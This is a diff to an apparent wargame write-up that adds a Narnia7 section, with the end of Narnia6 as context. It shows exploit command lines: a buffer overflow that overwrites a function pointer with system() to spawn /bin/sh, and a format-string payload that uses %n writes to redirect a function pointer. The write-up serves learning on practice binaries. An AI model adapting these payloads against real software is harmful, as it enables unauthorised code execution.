@@ -231,3 +231,10 @@ Breakpoint 6, 0x080486d7 in main ()
 0xffffd6b0:	0x08048790	0xf7fe9880
 ```
 as you can see, we overwritten fp with system's addres (0xf7e51940) and b1 contains our string. I added a ' ' & nop char so our program won't close. running ``./narnia6 $(python -c "print('\x2f\x62\x69\x6e\x2f\x73\x68\x3b'+'\x40\x19\xe5\xf7'+' '+'\x90')")`` will give us the pass.
+
+## Narnia7
+Initially, I read the code and figured out quite easily that we have a string format vulnerability, because we had a similar case in the previous levels. Again, we want to overwrite the function pointer with the "hacked" function address. I read a wonderful tutorial in here: https://jbremer.org/format-string-vulnerabilities/#comment-141623
+It has everything in order to complete this challange. In addition, it provides a methond to obtain the offset for our format string.
+To sum up, my query was:
+```./narnia7 $(python -c 'print("\x6c\xd5\xff\xff\x6e\xd5\xff\xff%34638c%6$n%32942c%7$n")') ```
+
